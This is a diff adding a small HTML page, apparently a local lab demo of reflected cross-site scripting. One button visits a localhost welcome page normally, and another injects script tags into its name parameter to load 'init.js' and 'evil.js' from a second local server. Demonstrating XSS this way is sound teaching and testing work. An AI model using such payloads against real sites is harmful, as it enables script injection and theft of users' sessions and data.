@@ -1,0 +1,42 @@
+<!doctype html>
+
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>A VERY Trustworthy Site</title>
+
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js"
+            integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+            crossorigin="anonymous">
+    </script>
+
+    <script>
+        let url_base = 'http://localhost:5000';
+        let welcome = '/welcome?name=';
+
+        function cleanClick() {
+            window.location.href = url_base + welcome + "User";
+        }
+
+        function dirtyClick() {
+
+            let xss =   'User<script+src="http://127.0.0.1:8000/init.js"><\/script><script+src="http://127.0.0.1:8000/evil.js"><\/script>';
+
+            let url = url_base + welcome + xss;
+
+            window.location.href = url.replace(/\s/g,'');
+        }
+
+    </script>
+
+</head>
+
+<body>
+    <p> First follow the clean link to the target website. Then follow the XSS link. </p>
+
+    <button onclick="cleanClick()">Clean</button>
+    <button onclick="dirtyClick()">XSS</button>
+
+
+</body>
+</html>
